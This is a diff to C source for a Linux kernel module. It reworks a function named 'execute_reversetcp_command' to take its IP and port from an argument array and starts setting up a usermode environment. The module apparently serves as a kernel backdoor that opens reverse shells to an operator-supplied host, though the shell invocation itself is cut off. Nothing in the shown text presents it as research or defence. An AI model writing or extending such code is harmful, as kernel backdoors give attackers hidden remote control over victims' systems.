@@ -4,7 +4,16 @@
 #include <linux/init.h>
 #include <linux/slab.h>  // For kmalloc and kfree
 
-void execute_reversetcp_command(const char *ip, const char *port) {
+void execute_reversetcp_command(const char **args, int arg_count) {
+    // Ensure that we have at least 2 arguments (IP and port)
+    if (arg_count < 2) {
+        printk(KERN_ERR "reverse_tcp command requires IP and port arguments\n");
+        return;
+    }
+
+    const char *ip = args[0];
+    const char *port = args[1];
+
     char *envp[] = { 
         "HOME=/", 
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
